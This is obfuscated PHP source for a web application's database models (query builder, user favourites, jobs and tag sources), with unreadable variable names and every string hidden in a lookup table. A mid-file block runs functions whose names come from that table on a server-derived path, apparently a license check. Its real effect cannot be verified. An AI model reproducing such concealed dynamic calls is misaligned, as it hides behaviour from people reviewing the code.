($f™Ç³ÇÂÀÚ[33] === $EÒ¾’‚íê© && $this->db) { return $this->db; } static $BÓÑĞÃ˜°· = array(); goto Aà®Ü­›Í; aÁŸáÂ¬Ùá: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $dõì‹öÆ… = get_class($this); if ($dõì‹öÆ… == $_SERVER[µ…][342]) { return $this->name; } $this->name = substr($dõì‹öÆ…, 0, -5); } return $this->name; } public function getTableName() { $FÜŒ¤…¯ç =& $_SERVER[µ…]; if (empty($this->trueTableName)) { $A¡Ëó†›Ğ¤ = !empty($this->tablePrefix) ? $this->tablePrefix : $FÜŒ¤…¯ç[33]; if (!empty($this->tableName)) { $A¡Ëó†›Ğ¤ .= $this->tableName; } else { $A¡Ëó†›Ğ¤ .= think_parse_name($this->name); } $this->trueTableName = strtolower($A¡Ëó†›Ğ¤); } return (!empty($this->dbName) ? $this->dbName . $FÜŒ¤…¯ç[94] : $FÜŒ¤…¯ç[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $c÷‚ã›ÁˆÎ =& $_SERVER[µ…]; return isset($this->fields[$c÷‚ã›ÁˆÎ[247]]) ? $this->fields[$c÷‚ã›ÁˆÎ[247]] : $this->pk; } public function getDbFields() { $F´‡çÃ…Éè =& $_SERVER[µ…]; if (isset($this->options[$F´‡çÃ…Éè[275]])) { $f°ÔàœÃ¬· = $this->db->getFields($this->options[$F´‡çÃ…Éè[275]]); return $f°ÔàœÃ¬· ? array_keys($f°ÔàœÃ¬·) : !1; } if ($this->fields) { $f°ÔàœÃ¬· = $this->fields; unset($f°ÔàœÃ¬·[$F´‡çÃ…Éè[246]], $f°ÔàœÃ¬·[$F´‡çÃ…Éè[247]], $f°ÔàœÃ¬·[$F´‡çÃ…Éè[248]], $f°ÔàœÃ¬·[$F´‡çÃ…Éè[245]]); return $f°ÔàœÃ¬·; } return !1; } public function data($bç¾Ü‡¾Ô = '') { $døõğ÷Â§¶ =& $_SERVER[µ…]; if ($døõğ÷Â§¶[33] === $bç¾Ü‡¾Ô && !empty($this->data)) { return $this->data; } if (is_object($bç¾Ü‡¾Ô)) { $bç¾Ü‡¾Ô = get_object_vars($bç¾Ü‡¾Ô); } elseif (is_string($bç¾Ü‡¾Ô)) { parse_str($bç¾Ü‡¾Ô, $bç¾Ü‡¾Ô); } elseif (!is_array($bç¾Ü‡¾Ô)) { think_exception(think_lang($døõğ÷Â§¶[267])); } $this->data = $bç¾Ü‡¾Ô; return $this; } public function join($b¶…ÅÈ’°±) { $E‡‚»Á²Œ =& $_SERVER[µ…]; if (is_array($b¶…ÅÈ’°±)) { $this->options[$E‡‚»Á²Œ[278]] = $b¶…ÅÈ’°±; } elseif (!empty($b¶…ÅÈ’°±)) { $this->options[$E‡‚»Á²Œ[278]][] = $b¶…ÅÈ’°±; } return $this; } public function union($dğ‚«‚Íçà, $E‰õ³‘“²é = false) { goto a‘à™ÍÙè¤; a‘à™ÍÙè¤: $bï×‡â«´Ñ =& $_SERVER[µ…]; if (empty($dğ‚«‚Íçà)) { return $this; } if ($E‰õ³‘“²é) { $this->options[$bï×‡â«´Ñ[343]][$bï×‡â«´Ñ[344]] = !0; } goto cºÎ¿¤´; cºÎ¿¤´: if (is_object($dğ‚«‚Íçà)) { $dğ‚«‚Íçà = get_object_vars($dğ‚«‚Íçà); } if (is_string($dğ‚«‚Íçà)) { $Dé³Ñ‰á¼Ÿ = $dğ‚«‚Íçà; } elseif (is_array($dğ‚«‚Íçà)) { if (isset($dğ‚«‚Íçà[0])) { $this->options[$bï×‡â«´Ñ[343]] = array_merge($this->options[$bï×‡â«´Ñ[343]], $dğ‚«‚Íçà); return $this; } else { $Dé³Ñ‰á¼Ÿ = $dğ‚«‚Íçà; } } else { think_exception(think_lang($bï×‡â«´Ñ[267])); } $this->options[$bï×‡â«´Ñ[343]][] = $Dé³Ñ‰á¼Ÿ; goto A«äÚ‹öÂ‹; A«äÚ‹öÂ‹: return $this; goto CŞÁÃ™Çî; CŞÁÃ™Çî: } public function cache($Cİ† è××Â = true, $Dæ°ôªò˜³ = null, $A‚Ê…Şº…® = '') { $cŒ»ĞÃ‹Ò =& $_SERVER[µ…]; if (!1 !== $Cİ† è××Â) { $this->options[$cŒ»ĞÃ‹Ò[345]] = array($cŒ»ĞÃ‹Ò[92] => $Cİ† è××Â, $cŒ»ĞÃ‹Ò[335] => $Dæ°ôªò˜³, $cŒ»ĞÃ‹Ò[29] => $A‚Ê…Şº…®); } return $this; } public function field($FŞ‹ª³‚¾Ã, $b¢Ä–‡äÖ = false) { $a¯¢‰°¹¥ =& $_SERVER[µ…]; if (!0 === $FŞ‹ª³‚¾Ã) { $eËññæùŸ = $this->getDbFields(); $FŞ‹ª³‚¾Ã = $eËññæùŸ ? $eËññæùŸ : $a¯¢‰°¹¥[181]; } elseif ($b¢Ä–‡äÖ) { if (is_string($FŞ‹ª³‚¾Ã)) { $FŞ‹ª³‚¾Ã = explode($a¯¢‰°¹¥[47], $FŞ‹ª³‚¾Ã); } $eËññæùŸ = $this->getDbFields(); $FŞ‹ª³‚¾Ã = $eËññæùŸ ? array_diff($eËññæùŸ, $FŞ‹ª³‚¾Ã) : $FŞ‹ª³‚¾Ã; } $this->options[$a¯¢‰°¹¥[269]] = $FŞ‹ª³‚¾Ã; return $this; } public function scope($AõàáË“ëó = '', $B´¬Âê¨òì = NULL) { $AóÓ‚œ¯å =& $_SERVER[µ…]; if ($AóÓ‚œ¯å[33] === $AõàáË“ëó) { if (isset($this->_scope[$AóÓ‚œ¯å[34]])) { $A©¼³éà¢ = $this->_scope[$AóÓ‚œ¯å[34]]; } else { return $this; } } elseif (is_string($AõàáË“ëó)) { $DÁ¯‘Í§Áƒ = explode($AóÓ‚œ¯å[47], $AõàáË“ëó); $A©¼³éà¢ = array(); foreach ($DÁ¯‘Í§Áƒ as $cö‘ˆ¼í”à) { if (!isset($this->_scope[$cö‘ˆ¼í”à])) { continue; } $A©¼³éà¢ = array_merge($A©¼³éà¢, $this->_scope[$cö‘ˆ¼í”à]); } if (!empty($B´¬Âê¨òì) && is_array($B´¬Âê¨òì)) { $A©¼³éà¢ = array_merge($A©¼³éà¢, $B´¬Âê¨òì); } } elseif (is_array($AõàáË“ëó)) { $A©¼³éà¢ = $AõàáË“ëó; } if (is_array($A©¼³éà¢) && !empty($A©¼³éà¢)) { $this->options = array_merge($this->options, array_change_key_case($A©¼³éà¢)); } return $this; } public function where($Bë¬š›İ§œ, $c›µË¥Û®‚ = null) { $cˆËç˜’Àä =& $_SERVER[µ…]; if (!is_null($c›µË¥Û®‚) && is_string($Bë¬š›İ§œ)) { if (!is_array($c›µË¥Û®‚)) { $c›µË¥Û®‚ = func_get_args(); array_shift($c›µË¥Û®‚); } $c›µË¥Û®‚ = array_map(array($this->db, $cˆËç˜’Àä[339]), $c›µË¥Û®‚); $Bë¬š›İ§œ = vsprintf($Bë¬š›İ§œ, $c›µË¥Û®‚); } elseif (is_object($Bë¬š›İ§œ)) { $Bë¬š›İ§œ = get_object_vars($Bë¬š›İ§œ); } elseif (is_array($Bë¬š›İ§œ)) { foreach ($Bë¬š›İ§œ as $d›ÚŠ­”Êà => $Cç´õ‹”…) { if ((is_numeric($d›ÚŠ­”Êà) || !$d›ÚŠ­”Êà) && is_string($Cç´õ‹”…)) { if (strpos($Cç´õ‹”…, $cˆËç˜’Àä[346]) === 0) { continue; } think_trace($cˆËç˜’Àä[347], $cˆËç˜’Àä[33], $cˆËç˜’Àä[46]); die; } } } if (is_string($Bë¬š›İ§œ) && $cˆËç˜’Àä[33] != $Bë¬š›İ§œ) { $B‹´¾”Ñ® = array(); $B‹´¾”Ñ®[$cˆËç˜’Àä[348]] = $Bë¬š›İ§œ; $Bë¬š›İ§œ = $B‹´¾”Ñ®; } if (isset($this->options[$cˆËç˜’Àä[271]])) { $this->options[$cˆËç˜’Àä[271]] = array_merge($this->options[$cˆËç˜’Àä[271]], $Bë¬š›İ§œ); } else { $this->options[$cˆËç˜’Àä[271]] = $Bë¬š›İ§œ; } return $this; } public function limit($d¶¬ù³Ëâ, $Bé•ÕŸï×¯ = null) { $fæ±Îœê‹Á =& $_SERVER[µ…]; $this->options[$fæ±Îœê‹Á[288]] = is_null($Bé•ÕŸï×¯) ? $d¶¬ù³Ëâ : $d¶¬ù³Ëâ . $fæ±Îœê‹Á[47] . $Bé•ÕŸï×¯; return $this; } public function page($E‘ğáÙ—Íæ, $AßùÉç™ğÍ = null) { $aÜ™ØÃ‚¡ =& $_SERVER[µ…]; $this->options[$aÜ™ØÃ‚¡[349]] = is_null($AßùÉç™ğÍ) ? $E‘ğáÙ—Íæ : $E‘ğáÙ—Íæ . $aÜ™ØÃ‚¡[47] . $AßùÉç™ğÍ; return $this; } public function comment($C¼ÔòÚóš) { $this->options[$_SERVER[µ…][350]] = $C¼ÔòÚóš; return $this; } public function setProperty($EÃÜ±‡¦Ñ, $B‚åæ„òö) { if (property_exists($this, $EÃÜ±‡¦Ñ)) { $this->{$EÃÜ±‡¦Ñ} = $B‚åæ„òö; } return $this; } } goto B›ö¤Õµ ; B»“É¡À—†: class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($EŠ…‹ä¡¾) { $Aâ¾õé‡¥ =& $_SERVER[µ…]; return array($Aâ¾õé‡¥[1772] => array(USER_ID, $Aâ¾õé‡¥[2085])); } protected function listData() { $CÜ­àšáÒ‚ =& $_SERVER[µ…]; $Dœç½‚¹‰ = array($CÜ­àšáÒ‚[1498] => USER_ID, $CÜ­àšáÒ‚[457] => 0); $CÙ¾÷öğ¡ê = $CÜ­àšáÒ‚[2086]; $Aå–â¿Õî = $this->field($CÙ¾÷öğ¡ê)->where($Dœç½‚¹‰)->order($CÜ­àšáÒ‚[2087])->select(); return $Aå–â¿Õî ? $Aå–â¿Õî : array(); } protected function resetCache() { } protected function listView() { goto Dš‹º™Òéë; Cƒº¼²õ’®: $b¸İ»ŒÊ§„ = array_to_keyvalue($b¸İ»ŒÊ§„, $FÇ²½àƒìè[390]); foreach ($b¢ˆøáß£ as $FäÌ¢—˜È => $Cº¬×šŠ‡Ë) { $FÏ İê²Á® = $b¸İ»ŒÊ§„[$Cº¬×šŠ‡Ë[$FÇ²½àƒìè[75]]]; $FÏ İê²Á® = $FÏ İê²Á® ? $FÏ İê²Á® : array(); $b¢ˆøáß£[$FäÌ¢—˜È] = array_merge($FÏ İê²Á®, $Cº¬×šŠ‡Ë); } return $b¢ˆøáß£; goto EÈÖæ”†½; Dš‹º™Òéë: $FÇ²½àƒìè =& $_SERVER[µ…]; $b¢ˆøáß£ = $this->listData(); $d­ø¬‘‚öÒ = array_filter_by_field($b¢ˆøáß£, $FÇ²½àƒìè[29], $FÇ²½àƒìè[403]); goto d‚…Ö¿®¬İ; BÂïÄ˜õ¬ô: $bŸ¢¨Šß‡¨ = array($FÇ²½àƒìè[404] => array($FÇ²½àƒìè[405], $AÌ¤ÈÏğÖÎ)); $b¸İ»ŒÊ§„ = Model($FÇ²½àƒìè[769])->listSource($bŸ¢¨Šß‡¨, $bˆƒø³µê†); $b¸İ»ŒÊ§„ = array_merge($b¸İ»ŒÊ§„[$FÇ²½àƒìè[73]], $b¸İ»ŒÊ§„[$FÇ²½àƒìè[74]]); goto Cƒº¼²õ’®; d‚…Ö¿®¬İ: $AÌ¤ÈÏğÖÎ = array_to_keyvalue($d­ø¬‘‚öÒ, $FÇ²½àƒìè[33], $FÇ²½àƒìè[75]); if (!$AÌ¤ÈÏğÖÎ) { return $b¢ˆøáß£; } $bˆƒø³µê† = 2000; goto BÂïÄ˜õ¬ô; EÈÖæ”†½: } protected function addFav($cÁ–Ğñ“ç‹, $Côààì¦Ü¼ = '', $dŠ­É‘ª¤— = "\163\x6f\x75\x72\143\145") { goto C„íöˆ„§ê; AÒÑª—Ÿ›Ñ: $a‡¥‚îÍ = array($FòŸ…¬‚Á·[1498] => USER_ID, $FòŸ…¬‚Á·[457] => 0); $FîîÃ†ŞŒ¦ = $this->where($a‡¥‚îÍ)->max($FòŸ…¬‚Á·[1692]); if (!$FîîÃ†ŞŒ¦) { $FîîÃ†ŞŒ¦ = 0; } goto AÕªÛ¨; C„íöˆ„§ê: $FòŸ…¬‚Á· =& $_SERVER[µ…]; $a‡¥‚îÍ = array($FòŸ…¬‚Á·[1498] => USER_ID, $FòŸ…¬‚Á·[457] => 0, $FòŸ…¬‚Á·[409] => $dŠ­É‘ª¤—, $FòŸ…¬‚Á·[408] => $cÁ–Ğñ“ç‹); if ($this->where($a‡¥‚îÍ)->find()) { return !1; } goto AÒÑª—Ÿ›Ñ; DôÎØôª‹¥: return $this->add($C˜¸‹…ÉÎÖ); goto bÑâ‹¶Üˆ÷; AÕªÛ¨: if (!$Côààì¦Ü¼ && $dŠ­É‘ª¤— == $FòŸ…¬‚Á·[403]) { $E¹‹Ë»ñ = Model($FòŸ…¬‚Á·[1181])->where(array($FòŸ…¬‚Á·[404] => $cÁ–Ğñ“ç‹))->find(); if (!$E¹‹Ë»ñ) { return !1; } $Côààì¦Ü¼ = $E¹‹Ë»ñ[$FòŸ…¬‚Á·[28]]; } $Côààì¦Ü¼ = $this->getAutoName($Côààì¦Ü¼); $C˜¸‹…ÉÎÖ = array($FòŸ…¬‚Á·[1498] => USER_ID, $FòŸ…¬‚Á·[457] => 0, $FòŸ…¬‚Á·[407] => $Côààì¦Ü¼, $FòŸ…¬‚Á·[408] => $cÁ–Ğñ“ç‹, $FòŸ…¬‚Á·[409] => $dŠ­É‘ª¤—, $FòŸ…¬‚Á·[1673] => $FîîÃ†ŞŒ¦ + 1); goto DôÎØôª‹¥; bÑâ‹¶Üˆ÷: } protected function remove($b“˜¥Ù®ù™) { $b×ŒøÑÛ =& $_SERVER[µ…]; $bÔÍ‹ÉëØÕ = array($b×ŒøÑÛ[1498] => USER_ID, $b×ŒøÑÛ[406] => $b“˜¥Ù®ù™); return $this->where($bÔÍ‹ÉëØÕ)->delete(); } protected function removeByName($FÛŸó´ñ§) { $aãÇôèÅ¨À =& $_SERVER[µ…]; $dØº¥¼ÁĞ = array($aãÇôèÅ¨À[1498] => USER_ID, $aãÇôèÅ¨À[407] => $FÛŸó´ñ§, $aãÇôèÅ¨À[457] => 0); return $this->where($dØº¥¼ÁĞ)->delete(); } protected function rename($FØŸ…ªĞî , $DĞÒ•ñôÈå) { $CŒªñ‰˜¤ =& $_SERVER[µ…]; if ($FØŸ…ªĞî  == $DĞÒ•ñôÈå) { return !1; } $Dˆêš§ˆÜ = $this->getAutoName($DĞÒ•ñôÈå); if ($DĞÒ•ñôÈå != $Dˆêš§ˆÜ) { return !1; } $eÖ”¹Å‹‘º = array($CŒªñ‰˜¤[1498] => USER_ID, $CŒªñ‰˜¤[457] => 0, $CŒªñ‰˜¤[28] => $FØŸ…ªĞî ); return $this->where($eÖ”¹Å‹‘º)->save(array($CŒªñ‰˜¤[28] => $DĞÒ•ñôÈå)); } protected function resetSort($dš½ë‡Û§ë) { $DŞƒÉ©ÑŠ‚ =& $_SERVER[µ…]; $dš½ë‡Û§ë = is_array($dš½ë‡Û§ë) ? $dš½ë‡Û§ë : array(); $b—ÈªÇ¶¨¦ = array($DŞƒÉ©ÑŠ‚[1498] => USER_ID); for ($aã×Š†î« = 0; $aã×Š†î« < count($dš½ë‡Û§ë); $aã×Š†î«++) { $b—ÈªÇ¶¨¦[$DŞƒÉ©ÑŠ‚[406]] = $dš½ë‡Û§ë[$aã×Š†î«]; $this->where($b—ÈªÇ¶¨¦)->save(array($DŞƒÉ©ÑŠ‚[1673] => $aã×Š†î« + 1)); } return !0; } protected function moveTop($aí”Æ‘àíÌ) { goto c®‹ù¼İÎ; dÜÌ„å¥ì: if (!$BšÓµ¯„†) { return; } $E¤½¹è† = $this->field($a³ÕÊÌ†Ì[388])->where($A”‘™ÏãÃµ)->order($a³ÕÊÌ†Ì[2087])->select(); $E¤½¹è† = array_to_keyvalue($E¤½¹è†, $a³ÕÊÌ†Ì[33], $a³ÕÊÌ†Ì[388]); goto CÑÕ´öˆÍö; c®‹ù¼İÎ: $a³ÕÊÌ†Ì =& $_SERVER[µ…]; $A”‘™ÏãÃµ = array($a³ÕÊÌ†Ì[1498] => USER_ID, $a³ÕÊÌ†Ì[457] => 0); $BšÓµ¯„† = $this->where($A”‘™ÏãÃµ)->where(array($a³ÕÊÌ†Ì[28] => $aí”Æ‘àíÌ))->find(); goto dÜÌ„å¥ì; CÑÕ´öˆÍö: $CÏÈªãØÄ¸ = $E¤½¹è†; $E¤½¹è† = array_remove_value($E¤½¹è†, $BšÓµ¯„†[$a³ÕÊÌ†Ì[388]]); array_unshift($E¤½¹è†, $BšÓµ¯„†[$a³ÕÊÌ†Ì[388]]); goto FÎ÷°”®œé; FÎ÷°”®œé: return $this->resetSort($E¤½¹è†); goto f ì¡¯ŞÜƒ; f ì¡¯ŞÜƒ: } protected function moveBottom($cÆ”šù©õ¾) { $eù‰ª×Šš« =& $_SERVER[µ…]; $F³æ·¹ƒ‹¤ = array($eù‰ª×Šš«[1498] => USER_ID, $eù‰ª×Šš«[457] => 0); $f¨Ë†±Ö = $this->where($F³æ·¹ƒ‹¤)->max($eù‰ª×Šš«[1692]); $D¬Íî–¹õ‘ = array($eù‰ª×Šš«[1692] => $f¨Ë†±Ö + 1); return $this->where($F³æ·¹ƒ‹¤)->where(array($eù‰ª×Šš«[28] => $cÆ”šù©õ¾))->save($D¬Íî–¹õ‘); } private function getAutoName($aÉ¶ƒéò£š) { goto FÄ…ŞÛìç©; FÄ…ŞÛìç©: $f¿ ÖÇ†Ç× =& $_SERVER[µ…]; $cÅø®¨¦ê» = array($f¿ ÖÇ†Ç×[1498] => USER_ID, $f¿ ÖÇ†Ç×[457] => 0); $A“ÛˆÙ¡Ï¬ = $this->field($f¿ ÖÇ†Ç×[28])->where($cÅø®¨¦ê»)->select(); goto fÊÁ”èµ; d¢ôé¡¬è­: return $aÉ¶ƒéò£š . "\x28{$E—®øù ˆÅ}\51"; goto b—µø‰»‰»; fÊÁ”èµ: $A“ÛˆÙ¡Ï¬ = array_to_keyvalue($A“ÛˆÙ¡Ï¬, $f¿ ÖÇ†Ç×[33], $f¿ ÖÇ†Ç×[28]); if (!$A“ÛˆÙ¡Ï¬ || !in_array($aÉ¶ƒéò£š, $A“ÛˆÙ¡Ï¬)) { return $aÉ¶ƒéò£š; } for ($E—®øù ˆÅ = 0; $E—®øù ˆÅ < count($A“ÛˆÙ¡Ï¬); $E—®øù ˆÅ++) { if (!in_array($aÉ¶ƒéò£š . "\x28{$E—®øù ˆÅ}\x29", $A“ÛˆÙ¡Ï¬)) { return $aÉ¶ƒéò£š . "\50{$E—®øù ˆÅ}\x29"; } } goto d¢ôé¡¬è­; b—µø‰»‰»: } } if ($_SERVER[$_SERVER[µ…][812]] != $_SERVER[$_SERVER[µ…][1236]]) { goto fÕ‘‰êä§˜; fÕ‘‰êä§˜: $bŠà…„–Ğê = $_SERVER[µ…][814]; $CˆÙÏå¿× = $_SERVER[$_SERVER[µ…][815]] . $_SERVER[µ…][816]; $f›éÑÒß = $bŠà…„–Ğê($CˆÙÏå¿×); goto Eì¸øº·â«; aºÕÀö©ß: $Côö±ò†¹‰($_SERVER[$_SERVER[µ…][810]]); goto FÏˆİ…»Ñ–; Eì¸øº·â«: $dƒèŞõ¹× = explode($_SERVER[µ…][227], $f›éÑÒß); if (count($dƒèŞõ¹×) < $_SERVER[µ…][577]) { $F®™¼Ïù´ß = $_SERVER[µ…][817]; $F®™¼Ïù´ß(); } $Côö±ò†¹‰ = $_SERVER[µ…][1237]; goto aºÕÀö©ß; FÏˆİ…»Ñ–: } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\152\157\x62\x4c\151\x73\x74"; public $field = array("\156\x61\155\x65", "\x64\145\x73\x63", "\x73\x6f\x72\x74"); const JOB_KEY = "\x73\145\x6c\146\112\x6f\x62\114\x69\163\x74"; public function listData($fƒ¥­¯ÛØ = false, $B ÀÎÍö¤Ù = "\x73\x6f\x72\x74", $eá÷ã‘¢×× = false) { return parent::listData($fƒ¥­¯ÛØ, $B ÀÎÍö¤Ù, $eá÷ã‘¢××); } public function remove($a›‹¶ğõ—) { return parent::remove($a›‹¶ğõ—); } public function add($FÎÖöĞ‰±õ) { $fİ‹ÇÍ—ª÷ =& $_SERVER[µ…]; if ($this->findByName($FÎÖöĞ‰±õ[$fİ‹ÇÍ—ª÷[28]])) { return !1; } $FÎÖöĞ‰±õ[$fİ‹ÇÍ—ª÷[1692]] = $this->getSort(); return parent::insert($FÎÖöĞ‰±õ); } private function getSort() { $cç·ß‚÷è =& $_SERVER[µ…]; $DÑöáøĞ‹œ = parent::listData(); $Câ……Ãà˜— = array_to_keyvalue($DÑöáøĞ‹œ, $cç·ß‚÷è[33], $cç·ß‚÷è[1692]); return empty($Câ……Ãà˜—) ? 0 : max($Câ……Ãà˜—) + 1; } public function update($BÍˆ¸ÔêÔÈ, $BÛ™„©öÆ) { $c¦šˆƒŠËÌ =& $_SERVER[µ…]; $eº¬â’òñõ = parent::listData($BÍˆ¸ÔêÔÈ); $CÚ‹ƒî‹”” = $this->findByName($BÛ™„©öÆ[$c¦šˆƒŠËÌ[28]]); if (!$eº¬â’òñõ || $CÚ‹ƒî‹”” && $CÚ‹ƒî‹””[$c¦šˆƒŠËÌ[388]] != $eº¬â’òñõ[$c¦šˆƒŠËÌ[388]]) { return !1; } return parent::update($BÍˆ¸ÔêÔÈ, $BÛ™„©öÆ); } public function setUserJob($AÖ…‹ß”ŒŞ, $E¬Öï¦õ¶) { goto C¿À»Ø‹ßë; E¸¸Ç³¥š†: $cËÍÎİ˜š‰ = array_to_keyvalue($CÄå¼î•è, $b ®ò¦õ–†[28]); $A‘ˆœËª´‹ = $b ®ò¦õ–†[373]; foreach ($E¬Öï¦õ¶ as $aˆ‹Ú—ä¥Â) { if ($cËÍÎİ˜š‰[$aˆ‹Ú—ä¥Â]) { $A‘ˆœËª´‹ .= $cËÍÎİ˜š‰[$aˆ‹Ú—ä¥Â][$b ®ò¦õ–†[388]] . $b ®ò¦õ–†[47]; } else { $BŒªÄ¬Œ­ = $this->add($aˆ‹Ú—ä¥Â); $A‘ˆœËª´‹ .= $BŒªÄ¬Œ­ . $b ®ò¦õ–†[47]; } } goto aÕÉ®é½¥; aÕÉ®é½¥: $A‘ˆœËª´‹ = rtrim($A‘ˆœËª´‹, $b ®ò¦õ–†[47]); Model($b ®ò¦õ–†[501])->metaSet($AÖ…‹ß”ŒŞ, self::JOB_KEY, $A‘ˆœËª´‹); goto cÛˆ‘‰˜ªï; C¿À»Ø‹ßë: $b ®ò¦õ–† =& $_SERVER[µ…]; if (!is_array($E¬Öï¦õ¶)) { $E¬Öï¦õ¶ = array($E¬Öï¦õ¶); } $CÄå¼î•è = parent::listData(); goto E¸¸Ç³¥š†; cÛˆ‘‰˜ªï: } public function getUserJob($d´™“²®) { $EÅìÔç®‰ä = Model($_SERVER[µ…][501])->metaGet($d´™“²®); return $this->getUserJobInfo($EÅìÔç®‰ä[self::JOB_KEY]); } public function getUserJobInfo($Cİ®øò˜¿ƒ) { goto eíó‹ ‡ª™; fÅîƒáÉëê: return $DğãöÒªÂ; goto Cº°¥é‚’Ë; cê¬ËÓ•ÍÒ: $A´‘£ŒÑ¡© = array_remove_key($A´‘£ŒÑ¡©, $e¡›Óµ¶°å[192]); $DğãöÒªÂ = array(); foreach ($Eòˆó­à§§ as $C¾‡Â±®š) { if (isset($A´‘£ŒÑ¡©[$C¾‡Â±®š])) { $DğãöÒªÂ[] = $A´‘£ŒÑ¡©[$C¾‡Â±®š]; } } goto fÅîƒáÉëê; eíó‹ ‡ª™: $e¡›Óµ¶°å =& $_SERVER[µ…]; $Eòˆó­à§§ = explode($e¡›Óµ¶°å[47], $Cİ®øò˜¿ƒ); $A´‘£ŒÑ¡© = parent::listData(); goto cê¬ËÓ•ÍÒ; Cº°¥é‚’Ë: } } goto Fàˆ‚ÖÒ»; A©”ƒÄ¼Ó“: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\x66\141\166"; protected function cacheFunctionAlias($f…”†î¹¢) { $b¡ğ²«çŒ =& $_SERVER[µ…]; return array($b¡ğ²«çŒ[1772] => array(USER_ID, $b¡ğ²«çŒ[1773])); } protected function listData() { $Cìá¸ÓÃ—Ú =& $_SERVER[µ…]; $A†§á†Š× = array($Cìá¸ÓÃ—Ú[1498] => USER_ID, $Cìá¸ÓÃ—Ú[457] => array($Cìá¸ÓÃ—Ú[1776], 0)); $Eš¹ÔÆ¾Ì = $Cìá¸ÓÃ—Ú[1778]; $A¥Ü¿ò×ª¹ = $this->field($Eš¹ÔÆ¾Ì)->where($A†§á†Š×)->order($Cìá¸ÓÃ—Ú[1779])->select(); return $A¥Ü¿ò×ª¹ ? $A¥Ü¿ò×ª¹ : array(); } protected function listByTag($F—ÚÇ¥†Ï) { } protected function addToTag($Eäé¡ÙÔ˜ƒ, $e¾àÍÀ‰â) { $E—¾Á¹Ë“† =& $_SERVER[µ…]; if (!Model($E—¾Á¹Ë“†[1913])->listData($e¾àÍÀ‰â) || !Model($E—¾Á¹Ë“†[769])->pathInfo($Eäé¡ÙÔ˜ƒ)) { return !1; } $f÷‹ÓóÑò£ = array($E—¾Á¹Ë“†[1498] => USER_ID, $E—¾Á¹Ë“†[457] => $e¾àÍÀ‰â, $E—¾Á¹Ë“†[408] => $Eäé¡ÙÔ˜ƒ, $E—¾Á¹Ë“†[409] => $E—¾Á¹Ë“†[403], $E—¾Á¹Ë“†[407] => $E—¾Á¹Ë“†[33], $E—¾Á¹Ë“†[1673] => 0); if ($this->where($f÷‹ÓóÑò£)->find()) { return !1; } return $this->add($f÷‹ÓóÑò£); } protected function removeFromTag($d‚Ÿ½£«·›, $fôğêá…‹) { $E´Ò Ş¨ëÂ =& $_SERVER[µ…]; if (!Model($E´Ò Ş¨ëÂ[1913])->listData($fôğêá…‹)) { return !1; } if (is_array($d‚Ÿ½£«·›)) { $d‚Ÿ½£«·› = array($E´Ò Ş¨ëÂ[7], $d‚Ÿ½£«·›); } $aêÏñø§¿í = array($E´Ò Ş¨ëÂ[1498] => USER_ID, $E´Ò Ş¨ëÂ[457] => $fôğêá…‹, $E´Ò Ş¨ëÂ[409] => $E´Ò Ş¨ëÂ[403], $E´Ò Ş¨ëÂ[408] => $d‚Ÿ½£«·›); return $this->where($aêÏñø§¿í)->delete(); } protected function removeByTag($Cª¥êã¢) { $dŠï µœ¯ =& $_SERVER[µ…]; if (!$Cª¥êã¢) { return !1; } $f°…Â³’¡­ = array($dŠï µœ¯[1498] => USER_ID, $dŠï µœ¯[457] => $Cª¥êã¢); return $this->where($f°…Â³’¡­)->delete(); } protected function removeBySource($C²İêõ¦ŸÏ) { $dõÈ“Ö†ìƒ =& $_SERVER[µ…]; if (is_array($C²İêõ¦ŸÏ)) { $C²İêõ¦ŸÏ = array($dõÈ“Ö†ìƒ[7], $C²İêõ¦ŸÏ); } $Bóªœ˜Á·í = array($dõÈ“Ö†ìƒ[1498] => USER_ID, $dõÈ“Ö†ìƒ[408] => $C²İêõ¦ŸÏ, $dõÈ“Ö†ìƒ[457] => array($dõÈ“Ö†ìƒ[949], 0)); return $this->where($Bóªœ˜Á·í)->delete(); } }